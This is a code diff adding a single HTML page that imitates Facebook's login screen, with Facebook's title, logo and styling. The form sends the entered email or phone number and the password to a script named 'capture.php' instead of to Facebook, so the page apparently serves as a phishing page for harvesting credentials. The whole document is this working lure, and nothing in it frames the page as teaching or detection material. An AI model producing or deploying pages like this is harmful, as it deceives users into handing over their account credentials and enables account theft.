@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <title>Facebook – log in or sign up</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto:400,700'>
+    <style>
+        body { background: #f0f2f5; font-family: Roboto, Arial, sans-serif; }
+        .container { max-width: 400px; margin: 80px auto; background: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); padding: 32px; }
+        .logo { display: block; margin: 0 auto 24px; width: 180px; }
+        .input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
+        .btn { width: 100%; background: #1877f2; color: #fff; border: none; border-radius: 6px; padding: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .btn:hover { background: #165ecb; }
+        .forgot { display: block; text-align: center; margin: 16px 0; color: #1877f2; text-decoration: none; }
+        .divider { border-top: 1px solid #ddd; margin: 24px 0; }
+        .create { background: #42b72a; margin-top: 8px; }
+    </style>
+</head>
+<body>
+    <div class='container'>
+        <img src='https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.svg' class='logo' alt='Facebook'>
+        <form action="capture.php" method='POST'>
+            <input class='input' type='text' name='email' placeholder='Email address or phone number' required>
+            <input class='input' type='password' name='password' placeholder='Password' required>
+            <button class='btn' type='submit'>Log In</button>
+        </form>
+        <a class='forgot' href='#'>Forgotten password?</a>
+        <div class='divider'></div>
+        <button class='btn create' type='button'>Create New Account</button>
+    </div>
+</body>
+</html>
